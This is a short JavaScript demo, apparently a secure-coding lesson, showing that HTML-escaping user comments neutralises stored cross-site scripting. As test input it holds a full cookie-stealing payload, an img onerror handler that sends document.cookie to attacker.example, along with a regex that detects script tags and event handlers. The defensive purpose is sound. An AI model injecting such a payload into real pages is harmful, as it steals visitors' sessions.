// FIXED: encode untrusted text for the context it lands in (here: HTML body text).
const escapeHtml = (s) =>
  String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

function renderComment(author, text) {
  return `<div class="comment"><b>${escapeHtml(author)}</b>: ${escapeHtml(text)}</div>`;
}

const looksExecutable = (html) => /<script|<[a-z][^>]*\son[a-z]+\s*=/i.test(html);

const attackerComment = `<img src=x onerror="new Image().src='https://attacker.example/c?'+document.cookie">`;
const html = renderComment('mallory', attackerComment);

console.log('[demo] same attacker comment. The server now sends this HTML to every visitor:');
console.log('  ' + html);
if (!looksExecutable(html)) {
  console.log('\n[BLOCKED] the angle brackets became harmless text; readers see the attacker\'s string, nothing runs.');
}
